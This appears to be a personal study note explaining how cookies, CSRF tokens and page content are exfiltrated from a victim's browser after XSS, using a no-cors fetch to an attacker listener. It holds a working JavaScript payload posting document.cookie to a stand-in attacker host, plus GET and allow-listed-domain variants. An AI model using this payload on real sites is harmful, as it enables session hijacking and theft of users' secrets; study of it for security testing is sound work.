---
id: "202607060004"
title: Exfiltrating data via fetch and an out-of-band collaborator
date: 2026-07-06
type: concept
tags: [xss, exfiltration, oob, fetch]
publish: false
---

Standard pattern for getting a secret value (cookie, CSRF token, page content) out of a victim's browser once script execution is achieved: make a cross-origin request to an attacker-controlled listener, carrying the secret as the request body or a query parameter.

```javascript
fetch('https://attacker-collaborator-host/', {
  method: 'POST',
  mode: 'no-cors',   // avoids needing a CORS-permissive response from the listener
  body: document.cookie
});
```

`mode: 'no-cors'` matters: the attacker doesn't need to *read* the response (they're reading it later from their own listener's logs), just needs the request to actually leave the browser — `no-cors` sidesteps any CORS preflight/response-reading restriction entirely.

When the target app firewalls calls to arbitrary external hosts (only permitting a specific allowed collaborator domain), the listener has to be that permitted domain — the technique itself is unaffected, only the destination is constrained. A GET-based variant (secret appended to the URL) is used when the target's outbound restriction only allows navigation, not `fetch`.

## Links
- Applied in: [[202607060003 Stored XSS to steal session cookies via out-of-band fetch]]
- Same exfiltration channel reused for CSRF token theft in: [[202607120001 Dangling-markup CSRF-token theft under a strict CSP]]
